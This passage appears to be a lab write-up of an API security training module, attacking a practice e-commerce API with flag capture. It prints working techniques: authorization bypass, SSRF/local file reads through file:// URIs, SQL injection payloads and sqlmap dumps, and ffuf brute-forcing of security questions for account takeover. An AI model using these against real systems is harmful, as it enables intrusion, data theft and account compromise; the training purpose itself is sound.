  "jwt": "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjlAaGFja3RoZWJveC5jb20iLCJleHAiOjE3NjgwNjIwNjksImlzcyI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIiLCJhdWQiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIn0.TCDUxkZz4j0SAttN7HFjVoNJTtYIGtyDkIb7T42h2haFhVFmgqMf3ls-AOS4bk2Kr3s8RWjCzlTY1Of8o7OPgw"
}
}
```

After authorizing with the JWT, querying `/api/v1/roles/current-user` shows that the authenticated user has **no roles assigned**.

This makes the account an ideal candidate for testing **function-level authorization controls**, as it should only be able to access endpoints that explicitly require no roles.

We systematically enumerate API endpoints and identify the following endpoint of interest:

```
/api/v1/products/discounts
```

![Filtered output](..images/bfla.PNG)

According to the API documentation, this endpoint requires the role:

```
ProductDiscounts_GetAll
```

However, despite lacking this role, sending a request to the endpoint returns discount data for all products:

```json
{
  "productDiscounts": [
    {
      "productID": "a923b706-0aaa-49b2-ad8d-21c97ff6fac7",
      "ratePercentage": 70,
      "startDate": "2023-03-15",
      "endDate": "2023-09-15"
    },
    {
      "productID": "a61e2b25-2f6e-468e-9f15-c51864db4133",
      "ratePercentage": 30,
      "startDate": "2023-01-20",
      "endDate": "2023-07-05"
    },
    {
      "productID": "f6ebdcab-fcbf-4121-8be8-dddc427c68e3",
      "ratePercentage": 50,
      "startDate": "2023-01-15",
      "endDate": "2023-08-10"
    },
    .
    .
    .
```

![Filtered output](..images/bfla2.PNG)

This confirms a **Broken Function Level Authorization** vulnerability. Although the endpoint is documented as restricted, **no role-based access control is enforced**, allowing unauthorized users to retrieve sensitive business data such as discount rates and campaign periods.

Continuing endpoint enumeration reveals another vulnerable endpoint:

```
/api/v1/customers/billing-addresses
```

![Filtered output](..images/bfla3.PNG)

This endpoint is documented as requiring the role:

```
CustomerBillingAddresses_GetAll
```

Despite lacking this role, the endpoint responds with billing addresses for all customers:

```json
{
  "customersBillingAddresses": [
    {
      "customerID": "fe4a4b39-3df6-425a-9525-a7b2914f711b",
      "city": "Esbjerg",
      "country": "Denmark",
      "street": "851 Kongensgade",
      "postalCode": 76079
    },
    {
      "customerID": "3589e7f7-2d8a-4873-8bd9-b2c20b7a0ad2",
      "city": "Zurich",
      "country": "Switzerland",
      "street": "992 Bahnhofstrasse",
      "postalCode": 11746
    },
    {
      "customerID": "a0683cc9-a71f-4957-8fbb-45ead732040e",
      "city": "Fier",
      "country": "Albania",
      "street": "787 Bulevardi Dëshmorët e Kombit",
      "postalCode": 64633
    },
    .
    .
    .
```

This exposes **highly sensitive personally identifiable information (PII)**, including residential addresses, to unauthorized users.

Saving the response to a file and filtering for the flag yields:

```bash
grep -i "htb" billing-addresses.txt
```

Flag:

```
HTB{1e2095c564baf0d2d316080217040dae}
```

---

## Unrestricted Access to Sensitive Business Flows

All businesses operate with the primary goal of generating revenue. When an API exposes operations or data that allow users to **manipulate or abuse critical business logic**, it becomes vulnerable to **Unrestricted Access to Sensitive Business Flows**. These vulnerabilities do not necessarily stem from traditional technical flaws, but rather from insufficient protection of business-critical processes.

In the previous section (`Broken Function Level Authorization – BFLA`), we exploited an authorization flaw that allowed unauthorized access to **product discount data**. This issue directly results in **Unrestricted Access to Sensitive Business Flows**, as it exposes strategic pricing information that should only be available to privileged internal users.

By accessing the `/api/v1/products/discounts` endpoint without the required authorization, we obtained information about:

- Discounted products
- Discount percentages
- Discount start and end dates

For example, the following response reveals that the product with ID
`a923b706-0aaa-49b2-ad8d-21c97ff6fac7` is discounted by **70%** between **2023-03-15** and **2023-09-15**:

```json
{
  "productDiscounts": [
    {
      "productID": "a923b706-0aaa-49b2-ad8d-21c97ff6fac7",
      "ratePercentage": 70,
      "startDate": "2023-03-15",
      "endDate": "2023-09-15"
    }
  ]
}
```

With this knowledge, an attacker can strategically time purchases to maximize financial gain, undermining the platform’s pricing strategy and intended customer incentives.

If the purchasing endpoint additionally lacks **rate-limiting controls** (as discussed in the `Unrestricted Resource Consumption` section), the impact becomes significantly more severe. An attacker could:

- Purchase the entire available stock immediately when a discount becomes active
- Artificially limit availability for legitimate customers
- Resell the products later at a higher price, generating direct profit

This demonstrates how **business logic vulnerabilities** can be chained with technical weaknesses, resulting in substantial financial loss, reputational damage, and disruption of normal business operations.

---

## Server Side Request Forgery (SSRF)

An API is vulnerable to **Server-Side Request Forgery (SSRF)** when it uses **user-controlled input to fetch local or remote resources without proper validation**. SSRF vulnerabilities occur when an application blindly trusts user-supplied URLs or resource identifiers, allowing an attacker to coerce the server into making requests to unintended destinations.

The target is vulnerable to [CWE-918, Server-Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html). 

A brief description of the weakness is shown below:

```
The web server receives a URL or similar request from an upstream component and retrieves the contents of this URL, but it does not sufficiently ensure that the request is being sent to the expected destination
```

Authentication is performed via the `/api/v1/authentication/suppliers/sign-in` endpoint:

```
{
  "Email": "htbpentester10@pentestercompany.com",
  "Password": "HTBPentester10"
}
```

The server responds with a valid JWT:

```json
{
  "jwt": "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjEwQHBlbnRlc3RlcmNvbXBhbnkuY29tIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjpbIlN1cHBsaWVyQ29tcGFuaWVzX1VwZGF0ZSIsIlN1cHBsaWVyQ29tcGFuaWVzX1VwbG9hZENlcnRpZmljYXRlT2ZJbmNvcnBvcmF0aW9uIl0sImV4cCI6MTc2ODA4MTUxNiwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.om7XssOTdrfDaoOORCf65tcN8I3cXaxg_mIKhJhSPe29l0V2TI_gCRiMX_mwlxR39YLQGee-qxUXWnMhwHyh5A"
}
```

After authorizing with the JWT, querying `/api/v1/roles/current-user` reveals that the authenticated user has the following roles assigned:

- `SupplierCompanies_Update`
- `SupplierCompanies_UploadCertificateOfIncorporation`

![Filtered output](..images/ssrf.PNG)

Reviewing the **Supplier-Companies** section reveals three endpoints associated with the assigned roles:

- `/api/v1/supplier-companies`
- `api/v1/supplier-companies/{ID}/certificates-of-incorporation`
- `/api/v1/supplier-companies/certificates-of-incorporation`

![Filtered output](..images/ssrf2.PNG)

Invoking the `/api/v1/supplier-companies/current-user` endpoint confirms that the authenticated user belongs to the supplier company with the following ID:

```json
b75a7c76-e149-4ca7-9c55-d9fc4ffa87be
```

```json
{
  "supplierCompany": {
    "id": "b75a7c76-e149-4ca7-9c55-d9fc4ffa87be",
    "name": "PentesterCompany",
    "email": "supplier@pentestercompany.com",
    "isExemptedFromMarketplaceFee": 0,
    "certificateOfIncorporationPDFFileURI": "CompanyDidNotUploadYet"
  }
}
```

![Filtered output](..images/ssrf3.PNG)

The `/api/v1/supplier-companies/certificates-of-incorporation` **POST** endpoint allows supplier-company staff to upload a certificate of incorporation in PDF format. This endpoint requires the `SupplierCompanies_UploadCertificateOfIncorporation` role, which we possess.

We first create a 30 MB PDF file:

```bash
dd if=/dev/urandom of=certificate-of-incorporation.pdf bs=1M count=30
```
We then upload the file, specifying our supplier company ID:

```bash
curl -X 'POST' \
  'http://94.237.53.219:55044/api/v1/supplier-companies/certificates-of-incorporation' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer <JWT>' \
  -H 'Content-Type: multipart/form-data' \
  -F 'CertificateOfIncorporationPDFFormFile=@certificate-of-incorporation.pdf;type=application/pdf' \
  -F 'CompanyID=b75a7c76-e149-4ca7-9c55-d9fc4ffa87be'
```

Reponse:

```json
{
  "successStatus": true,
  "fileURI": "file:///app/wwwroot/SupplierCompaniesCertificatesOfIncorporations/certificate-of-incorporation.pdf",
  "fileSize": 31457280
}
```

The API stores the file location using the `file://` URI scheme, which references local filesystem paths.

Querying `/api/v1/supplier-companies/current-user` again confirms that the `certificateOfIncorporationPDFFileURI` field now contains the uploaded file’s local path:

```json
{
  "supplierCompany": {
    "id": "b75a7c76-e149-4ca7-9c55-d9fc4ffa87be",
    "name": "PentesterCompany",
    "email": "supplier@pentestercompany.com",
    "isExemptedFromMarketplaceFee": 0,
    "certificateOfIncorporationPDFFileURI": "file:///app/wwwroot/SupplierCompaniesCertificatesOfIncorporations/certificate-of-incorporation.pdf"
  }
}
```

![Filtered output](..images/ssrf4.PNG)

The `/api/v1/supplier-companies` **PATCH** endpoint requires the `SupplierCompanies_Update` role and allows supplier-company staff to update company attributes, including the `CertificateOfIncorporationPDFFileURI` field:

```json
{
  "UpdatedSupplierCompany": {
    "SupplierCompanyID": "string",
    "IsExemptedFromMarketplaceFee": 1,
    "CertificateOfIncorporationPDFFileURI": "string"
  }
}
```
![Filtered output](..images/ssrf5.PNG)

Because the API does not validate the URI scheme or file path, we can perform an **SSRF / Local File Inclusion (LFI)** attack by pointing the field to an arbitrary local file:

```json
{
  "UpdatedSupplierCompany": {
    "SupplierCompanyID": "b75a7c76-e149-4ca7-9c55-d9fc4ffa87be",
    "IsExemptedFromMarketplaceFee": 1,
    "CertificateOfIncorporationPDFFileURI": "file:///etc/passwd"
  }
}
```

![Filtered output](..images/ssrf6.PNG)

Response:

```json
{
  "successStatus": true
}
```

The lack of validation confirms that the API blindly trusts user-controlled file URIs.

Next, we invoke the `/api/v1/supplier-companies/{ID}/certificates-of-incorporation` **GET** endpoint to retrieve the contents of the file referenced by `CertificateOfIncorporationPDFFileURI`:

```bash
curl -X 'GET' \
  'http://94.237.53.219:55044/api/v1/supplier-companies/b75a7c76-e149-4ca7-9c55-d9fc4ffa87be/certificates-of-incorporation' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer <JWT>'
```

Response:

```json
{
  "successStatus": true,
  "base64Data": "cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjQyOjY1NTM0Ojovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4Kbm9ib2R5Ong6NjU1MzQ6NjU1MzQ6bm9ib2R5Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgphcHA6eDoxNjU0OjE2NTQ6Oi9ob21lL2FwcDovYmluL3NoCg=="
}
```

![Filtered output](..images/ssrf7.PNG)

Decoding the base64 data reveals the contents of `/etc/passwd`:

```bash
echo "<base64 string>" | base64 -d
```

![Filtered output](..images/ssrf8.PNG)

---

## Security Misconfigurations

A common API security misconfiguration occurs **when user-controlled input is incorporated directly into SQL queries without proper validation or sanitization**. This can result in SQL injection vulnerabilities, allowing attackers to manipulate backend database queries and access unauthorized data. 

The target is vulnerable to The target is vulnerable to [CWE-89, Improper Neutralization of Special Elements used in an SQL Command](https://cwe.mitre.org/data/definitions/89.html).

A brief description of the weakness is shown below:

```
The product constructs all or part of an SQL command using externally-influenced input from an upstream component,
but it does not neutralize or incorrectly neutralizes special elements that could modify the intended SQL command when
it is sent to a downstream component. Without sufficient removal or quoting of SQL syntax in user-controllable inputs,
the generated SQL query can cause those inputs to be interpreted as SQL instead of ordinary user data.
```

Authentication is performed via the `/api/v1/authentication/suppliers/sign-in` endpoint:

```
{
  "Email": "htbpentester12@pentestercompany.com",
  "Password": "HTBPentester12"
}
```

The server responds with a valid JWT:

```json
{
  "jwt": "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjEyQHBlbnRlc3RlcmNvbXBhbnkuY29tIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjoiUHJvZHVjdHNfR2V0UHJvZHVjdHNUb3RhbENvdW50QnlOYW1lU3Vic3RyaW5nIiwiZXhwIjoxNzY4MTQ0MTYwLCJpc3MiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiJ9.p6yjtCI6fXd9tgPzGxkTe8L77m-xMyRWI0IcEaamox-fpwvz1c1Nkus9bgsoreq_cwY9Zh0GvPn9eKtHnLxwmw"
}
```

After authorizing with the JWT, querying `/api/v1/roles/current-user` reveals that the authenticated user has the following role assigned:

```
Products_GetProductsTotalCountByNameSubstring
```

The only endpoint related to that role is:

```
/api/v1/products/{Name}/count
```

The endpoint accepts a string parameter and returns the total number of products containing the supplied substring:

![Filtered output](..images/sqli.PNG)

Supplying a valid string such as `laptop` returns the expected result:

```bash
curl -X 'GET' \
  'http://83.136.254.84:56041/api/v1/products/laptop/count' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer <JWT>'
```

Response:

```json
{
  "productsCount": 18
}
```

When appending a single quote (`'`) to the parameter, the API returns an error:

```bash
curl -X 'GET' \
  'http://83.136.254.84:56041/api/v1/products/laptop%27/count' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer <JWT>'
```

Response:

```json
{
  "errorMessage": "An error has occurred!"
}
```

![Filtered output](..images/sqli2.PNG)

The presence of an unhandled SQL syntax error strongly indicates a **SQL injection vulnerability**.

To confirm exploitation, we attempt a basic SQL injection payload to bypass filtering logic:

```sql
' OR 1=1--  
```

Request:

```bash
curl -X 'GET' \
  'http://83.136.254.84:56041/api/v1/products/laptop%27%20OR%201%3D1--%20/count' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer <JWT>'
```

Response:

```json
{
  "productsCount": 720
}
```

This confirms that the injected condition is evaluated as part of the SQL query, allowing retrieval of all records in the `Products` table.

To further enumerate the vulnerability, we use **SQLmap** with a captured request:

```bash
sqlmap -r req.txt --risk=3 --level=5 --batch
```

SQLmap confirms that the endpoint is vulnerable to **boolean-based blind SQL injection** and identifies the backend DBMS as **SQLite**.

We proceed to enumerate available tables:

```bash
sqlmap -r req.txt --risk=3 --level=5 --technique=b --tables --batch
```

We discover 13 tables:

![Filtered output](..images/sqli4.PNG)

We can then dump sensitive data from individual tables, such as the `Supplier` table:

```bash
sqlmap -r req.txt --risk=3 --level=5 --technique=b -T Supplier --dump --batch
```

This reveals sensitive information, including email addresses and password hashes:

![Filtered output](..images/sqli5.PNG)

---

## Improper Inventory Management

As APIs **mature and evolve**, it is critical to implement **proper versioning and lifecycle management**. Improper inventory management—such as retaining deprecated or legacy API versions without adequate access controls—can significantly expand the attack surface and introduce severe security risks.

In the previous sections, all interaction was limited to **version** `v1` of the target API. However, when examining the API documentation dropdown labeled `Select a definition`, an additional version—`v0`—is discovered:

![Filtered output](..images/inventory-management.PNG)

Selecting `v0` reveals that this version contains **legacy and deleted data**, as indicated by the following description:

```
Inlanefreight E-Commerce Marketplace API Specification.
Need to delete this version. Not maintained anymore... We will keep it to retrieve legacy/deleted data whenever needed.
```

![Filtered output](..images/inventory-management2.PNG)

Unlike the `v1` endpoints, none of the `v0` endpoints display the **lock icon**, which is used to indicate that authentication is required. This suggests that **no authorization or authentication controls** are enforced for the legacy API version:

![Filtered output](..images/inventory-management3.PNG)

When invoking the `/api/v0/customers/deleted` endpoint, the API responds with **deleted customer records**, exposing highly sensitive information, including:

- Full names
- Email addresses
- Phone numbers
- Dates of birth
- Password hashes

**Example response:**

```json
{
    "ID": "e4585907-8c2a-4d84-85fc-597fc543031c",
    "Name": "Dmitri Owens",
    "Email": "DmitriOwens@fastmail.com",
    "PhoneNumber": "+49 1791 7237887",
    "BirthDate": "1965-04-06",
    "PasswordHash": "D240F1DCD425ABC171CC430413B3988F"
  },
  {
    "ID": "d6e83c4b-89f5-4c05-9049-84df80f656c7",
    "Name": "Nikolai Gordon",
    "Email": "NikolaiGordon@live.com",
    "PhoneNumber": "+61 9 3609 9256",
    "BirthDate": "1991-01-10",
    "PasswordHash": "F78F2477E949BEE2D12A2C540FB6084F"
  },
```

![Filtered output](..images/inventory-management4.PNG)

This behavior demonstrates **Improper Inventory Management**, where an obsolete and unauthenticated API version exposes sensitive and previously deleted data. Such information can be leveraged in:

- Credential stuffing and brute-force attacks
- Phishing and social engineering campaigns
- User account takeover attempts

Proper API version deprecation, access control enforcement, and data sanitization are essential to prevent this class of vulnerability.

---

## Unsafe Consumption of APIs

Modern APIs frequently interact with **external or third-party APIs** to exchange data and extend functionality. While this interconnectivity improves scalability and efficiency, it also introduces **significant security risks** when external data is implicitly trusted.

When developers **blindly trust responses from upstream APIs** without enforcing proper validation, sanitization, or verification, downstream systems may process malicious or manipulated data. This often results in relaxed security controls and can lead to injection flaws, logic manipulation, or unauthorized actions being performed on behalf of trusted systems.

An API that consumes another API insecurely is vulnerable to [CWE-1357: Reliance on Insufficiently Trustworthy Component](https://cwe.mitre.org/data/definitions/1357.html)

A brief description of the weakness is shown below:

```
The product is built from multiple separate components, but it uses a component that is not
sufficiently trusted to meet expectations for security, reliability, updateability, and maintainability.
```

---

## Exploitation - Example

After reporting all vulnerabilities present in versions `v0` and `v1` of the **Inlanefreight E-Commerce Marketplace**, the administrator attempted to remediate them in `v2`.

However, new functionality was introduced in `v2` by junior developers, raising concerns that additional vulnerabilities may have been unintentionally introduced. The goal is to assess the security posture of the new API version and apply the techniques covered throughout the module to compromise it.
The objective is to retrieve the contents of `/flag.txt`.

### Authentication and Initial Access

Authentication is performed via the following endpoint:

```
/api/v2/authentication/customers/sign-in
```

Using the credentials below:

```
{
  "Email": "htbpentester@hackthebox.com",
  "Password": "HTBPentester"
}
```

The server responds with a valid JWT:

```json
{
  "jwt": "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlckBoYWNrdGhlYm94LmNvbSIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVudGl0eS9jbGFpbXMvcm9sZSI6WyJTdXBwbGllcnNfR2V0IiwiU3VwcGxpZXJzX0dldEFsbCJdLCJleHAiOjE3NjgxNTk0MzMsImlzcyI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIiLCJhdWQiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIn0.MBbcuNaQIMjCnjN_NZryJuY4UDjypLa3hzuBYuomhW_uSXipb3n4E6IlXEPH1w-rpVjy5G4W0oddCtG9X-WPtA"
}
```

After authorizing with the JWT, querying the endpoint below reveals the roles assigned to the authenticated user:

```
/api/v2/roles/current-user
```

- `Suppliers_Get`
- `Suppliers_GetAll` 

Only two API endpoints are associated with these roles:

- `/api/v2/suppliers`
- `/api/v2/suppliers/{ID}`

### Supplier Enumeration

Invoking `/api/v2/suppliers` returns a list of all suppliers:

```json
{
  "suppliers": [
    {
      "id": "00ac3d74-6c7d-4ef0-bf15-00851bf353ba",
      "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
      "name": "James Allen",
      "email": "J.Allen1607@globalsolutions.com",
      "securityQuestion": "SupplierDidNotProvideYet",
      "professionalCVPDFFileURI": "SupplierDidNotUploadYet"
    },
    {
      "id": "575d53eb-30f7-41f0-8c82-6fe9405c1c32",
      "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
      "name": "Tyson Butler",
      "email": "T.Butler1205@globalsolutions.com",
      "securityQuestion": "SupplierDidNotProvideYet",
      "professionalCVPDFFileURI": "SupplierDidNotUploadYet"
    }
    .
    .
    .
}
```
The `/api/v2/suppliers/{ID}` endpoint allows querying individual suppliers by ID:

```bash
curl -X 'GET' \
  'http://94.237.120.119:31440/api/v2/suppliers/00ac3d74-6c7d-4ef0-bf15-00851bf353ba' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer <JWT>'
```

The response contains detailed supplier information, including the field:

```
professionalCVPDFFileURI
```

![Filtered output](..images/exploitation2.PNG)

One of the JSON parameters is called:

```
professionalCVPDFFileURI
```

Given that the objective is to retrieve `/flag.txt`, this field suggests a potential **SSRF** or **Local File Inclusion (LFI)** attack vector, which aligns with previously discussed vulnerabilities in the **Server-Side Request Forgery (SSRF)** section.

### CV Upload Functionality

An endpoint exists for uploading supplier CVs:

```
/api/v2/suppliers/current-user/cv (POST)
```

An initial attempt to upload a large PDF file fails:

```bash
dd if=/dev/urandom of=certificateOfIncorporation.pdf bs=1M count=30
```

Response:

```json
{
  "errorMessage": "Could not upload the CV, its either malicious or very big in size"
}
```

Even a small file (5 KB) is rejected, indicating that the issue is not file size. This suggests that **only supplier-authenticated users** are allowed to upload CVs.

Despite being authenticated as a customer, the user is able to access supplier-related endpoints and data. This represents a **Broken Function Level Authorization (BFLA)** vulnerability, as customers should not be able to enumerate supplier information.

### Identifying Password Reset Candidates

Some suppliers have configured security questions. Filtering the supplier list reveals several using the same question:

```
What is your favorite color?
```

Suppliers with this security question are extracted, along with their email addresses:

```
P.Howard1536@globalsolutions.com
L.Walker1872@globalsolutions.com
T.Harris1814@globalsolutions.com
B.Rogers1535@globalsolutions.com
M.Alexander1650@globalsolutions.com
```

![Filtered output](..images/exploitation6.PNG)

### Brute-Forcing Security Question Answers

Under the `Authentication` section, the following password reset functionality is identified:

```
/api/v2/authentication/suppliers/passwords/resets/security-question-answers
```

![Filtered output](..images/exploitation7.PNG)

A wordlist containing common colors is used to brute-force the security question answers. The request template is fuzzed using `ffuf`:


```bash
ffuf -w emails.txt:FUZZ1 -w colors.txt:FUZZ2 -request req.txt -request-proto http -fr "false"
```

A valid combination is discovered:

```
[Status: 200, Size: 22, Words: 1, Lines: 1, Duration: 13ms]
    * FUZZ1: B.Rogers1535@globalsolutions.com
    * FUZZ2: rust
```

![Filtered output](..images/exploitation8.PNG)

Using the recovered credentials, authentication as the supplier is successful:

```
/api/v2/authentication/suppliers/sign-in
```

```json
{
  "Email": "B.Rogers1535@globalsolutions.com",
  "Password": "Password123"
}
```

A valid supplier JWT is issued. With supplier privileges, the CV upload endpoint now functions correctly:

```bash
curl -X 'POST' \
  'http://83.136.249.164:44877/api/v2/suppliers/current-user/cv' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer <JWT>' \
  -H 'Content-Type: multipart/form-data' \
  -F 'SupplierCVPDFFormFile=@cv.pdf;type=application/pdf'
```

Response:

```json
{
  "successStatus": true,
  "fileURI": "file:///app/wwwroot/SupplierCVs/cv.pdf",
  "fileSize": 1185090
}
```

Querying the supplier profile confirms that the local file path is stored in the `professionalCVPDFFileURI` field.

```json
{
  "supplier": {
    "id": "36f17195-395f-443e-93a4-8ceee81c6106",
    "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
    "name": "Brandon Rogers",
    "email": "B.Rogers1535@globalsolutions.com",
    "securityQuestion": "What is your favorite color?",
    "professionalCVPDFFileURI": "file:///app/wwwroot/SupplierCVs/cv.pdf"
  }
}
```

![Filtered output](..images/exploitation9.PNG)

### Exploiting Unsafe API Consumption (SSRF / LFI)

The supplier profile update endpoint allows modification of the CV file URI:

```
/api/v2/suppliers/current-user (PATCH)
```

```json
{
  "SecurityQuestion": "string",
  "SecurityQuestionAnswer": "string",
  "ProfessionalCVPDFFileURI": "string",
  "PhoneNumber": "string",
  "Password": "string"
}
```

![Filtered output](..images/exploitation10.PNG)

Because the API fails to validate the URI scheme or enforce path restrictions, the field can be manipulated to reference an arbitrary local file:

```json
{
  "SecurityQuestion": "What is your favorite color?",
  "SecurityQuestionAnswer": "rust",
  "ProfessionalCVPDFFileURI": "file:///flag.txt",
  "PhoneNumber": "string",
  "Password": "Password123"
}
```

![Filtered output](..images/exploitation11.PNG)

The request is accepted successfully.

```json
{
  "SuccessStatus": true
}
```

Finally, invoking the CV retrieval endpoint:

```bash
curl -X 'GET' \
  'http://83.136.249.164:44877/api/v2/suppliers/current-user/cv' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer <JWT>'
```

Returns base64-encoded file contents:

```json
{
  "successStatus": true,
  "base64Data": "SFRCe2YxOTBiODBjZDU0M2E4NGIyMzZlOTJhMDdhOWQ4ZDU5fQo="
}
```

Decoding the data reveals the flag:

```bash
echo "SFRCe2YxOTBiODBjZDU0M2E4NGIyMzZlOTJhMDdhOWQ4ZDU5fQo=" | base64 -d
```

Flag:

```
HTB{f190b80cd543a84b236e92a07a9d8d59}
```